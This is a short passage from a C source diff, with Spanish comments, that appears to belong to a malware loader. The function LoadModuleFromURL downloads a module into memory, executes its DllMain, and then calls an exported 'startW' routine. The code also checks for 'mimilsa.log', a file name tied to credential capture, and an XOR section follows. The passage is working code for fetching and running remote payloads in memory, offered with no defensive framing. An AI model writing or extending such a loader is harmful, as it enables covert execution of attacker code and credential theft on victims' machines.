+            printf("[-] Advertencia: mimilsa.log no encontrado\n");
+            return FALSE;
+        }
+    }
+
+    // === Módulo normal: cargar en memoria local ===
     DWORD fileSize = 0;
     unsigned char* fileBuffer = DownloadToBuffer(url, &fileSize);
     if (!fileBuffer || fileSize == 0) {
@@ -915,14 +1097,26 @@ BOOL LoadModuleFromURL(const char* url) {
     }
 
     printf("[+] Módulo cargado en: 0x%p\n", moduleBase);
-    if (ExecuteModule(moduleBase)) {
-        printf("[+] Módulo ejecutado.\n");
-        return TRUE;
-    } else {
-        printf("[-] Fallo al ejecutar módulo.\n");
+
+    if (!ExecuteModule(moduleBase)) {
+        printf("[-] Fallo al ejecutar DllMain\n");
         VirtualFree(moduleBase, 0, MEM_RELEASE);
         return FALSE;
     }
+
+    // === Activación opcional para otros módulos ===
+    HMODULE hDll = (HMODULE)moduleBase;
+
+    typedef BOOL (WINAPI *startW_t)();
+    startW_t pStartW = (startW_t)GetProcAddress(hDll, "startW");
+    if (pStartW) {
+        printf("[*] Ejecutando startW...\n");
+        fflush(stdout);
+        pStartW();
+    }
+
+    printf("[+] Módulo normal cargado y ejecutado\n");
+    return TRUE;
 }
 
 // === XOR ===
